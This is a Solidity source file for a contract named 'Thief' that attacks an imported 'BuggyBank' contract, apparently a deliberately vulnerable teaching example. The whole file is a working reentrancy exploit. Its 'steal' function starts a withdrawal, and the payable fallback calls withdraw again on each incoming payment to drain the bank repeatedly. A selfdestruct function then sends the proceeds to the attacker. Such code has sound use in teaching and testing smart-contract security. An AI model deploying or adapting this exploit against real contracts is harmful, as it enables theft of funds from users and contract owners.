pragma solidity >= 0.4.22;

import "./BuggyBank.sol";

contract Thief {
    address public thief;
    uint retry;

    event ThiefContractCreated(address thief);
    event ThiefDeposit(address bank, uint amount);
    event ThiefWithdraw(address bank, uint amount);
    event ThiefSteal(address bank, uint amount, uint retry);
    event ThiefTransfer(address bank, address from, address to, uint amount);
    event ThiefContractTerminated(address recipient, uint amount);
    event ThiefTransferReceived(address sender, uint amount);


    modifier onlyThief() {
        require(msg.sender == thief, "only thief");
        _;
    }

    constructor() public {
        thief = msg.sender;
        emit ThiefContractCreated(msg.sender);
    }

    function deposit(address addr) public payable {
        BuggyBank(addr).deposit.value(msg.value)();
        emit ThiefDeposit(addr, msg.value);
    }

    function withdraw(address addr, uint amount) public onlyThief {
        BuggyBank(addr).withdraw(amount);
        emit ThiefWithdraw(addr, amount);
    }

    function transfer(address addr, address to, uint amount) public onlyThief {
        BuggyBank(addr).transfer(to,amount);
        emit ThiefTransfer(addr, address(this), to, amount);
    }

    function steal(address addr, uint amount, uint times) public onlyThief {
        retry = times;
        BuggyBank(addr).withdraw(amount);
        emit ThiefSteal(addr,amount,times);
    }

    function() external payable {
        emit ThiefTransferReceived(msg.sender, msg.value);
        if (retry > 0) {
            retry -= 1;
            BuggyBank(msg.sender).withdraw(msg.value);
        }
    }

    function kill() public onlyThief {
        emit ThiefContractTerminated(msg.sender, address(this).balance);
        selfdestruct(msg.sender);
    }

}